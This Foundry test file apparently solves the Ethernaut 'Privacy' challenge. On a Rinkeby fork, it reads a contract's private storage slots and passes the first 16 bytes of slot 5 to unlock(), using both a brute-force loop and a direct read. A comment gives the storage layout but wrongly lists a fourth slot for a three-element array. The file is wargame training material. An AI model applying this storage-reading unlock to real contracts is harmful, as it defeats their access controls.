// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import { console } from "forge-std/console.sol";
import { PRBTest } from "@prb/test/PRBTest.sol";

import { Privacy } from "src/Privacy/Privacy.sol";

import { toBytes } from "src/utils/toBytes.sol";
import { bytes32ToString } from "src/utils/toString.sol";


contract PrivacyAttackForkTest is PRBTest {
    uint256 public rinkeby;
    uint256 public local;
    address public privacyInstance = address(0x9513c6F862FBdcA30aE7779AD33FE05136b05872);

    function setUp() public {
        rinkeby = vm.createFork(vm.envString("ETH_RINKEBY_RPC_URL"));
    }

    // this test will fail when it finds the correct slot number. Check the console for the result
    function testForkBruteforcePassword() public {
        bool success;
        uint8 slotCounter = 0;
        bytes32 storageData;
        vm.selectFork(rinkeby);
        while (success == false) {
            // get storage slot data
            storageData = vm.load(privacyInstance, bytes32(toBytes(slotCounter)));
            console.logString("SLOT NUMBER:::");
            console.log(slotCounter);
            // we expect a revert for every non-successful password
            vm.expectRevert();
            Privacy(privacyInstance).unlock(bytes16(storageData));
            success = Privacy(privacyInstance).locked() == false;
            ++slotCounter;
        }
    }

    /*
        NOTE:: Privacy.unlock() checks the first 16 bytes of data[2] as the unlock key, which is the 5th storage slot

        ---SLOT 0
        bool public locked = true;
        ---SLOT 1
        uint256 public ID = block.timestamp;
        ---SLOT 2
        uint8 private flattening = 10;
        uint8 private denomination = 255;
        uint16 private awkwardness = uint16(block.timestamp);
        ---SLOT 3, 4, 5, 6
        bytes32[3] private data;
        
    */
    function testForkPassword() public {
        bool success;
        bytes32 storageData;
        vm.selectFork(rinkeby);

        // get storage slot data
        storageData = vm.load(privacyInstance, bytes32(toBytes(5)));
        Privacy(privacyInstance).unlock(bytes16(storageData));
        success = Privacy(privacyInstance).locked() == false;
        // assert that this is is the correct slot
        assert(success);
    }

}
